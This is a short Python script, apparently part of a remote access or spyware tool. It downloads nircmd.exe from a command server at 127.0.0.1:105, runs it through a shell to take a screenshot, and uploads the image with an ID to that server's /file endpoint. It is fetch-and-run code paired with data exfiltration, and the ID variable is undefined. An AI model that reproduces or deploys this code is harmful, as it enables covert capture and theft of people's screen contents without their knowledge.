import requests
from base64 import b64decode
import subprocess,os
binary = ""
path = os.getenv("temp")+"\\"+"nircmd.exe"
url = "http://127.0.0.1:105/static/nircmd.exe"
def download(url):
	r = requests.get(url)
	f = open(path,'wb')
	f.write(r.content)
	f.close()
	print("file writeen successfully")

def run_command(command):
    out, err = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
    return out + err

    # os.remove(temp+"\\nircmd.exe")
def run():
	download(url)
	run_command(path+" savescreenshot screenshot.png")
run()
data = {
    'ID':ID,
    'Type':"Screen"}
files = {'file': open('screenshot.png','rb')}
print("sending screenshot")
r = requests.post('http://127.0.0.1:105/file', data=data,files=files)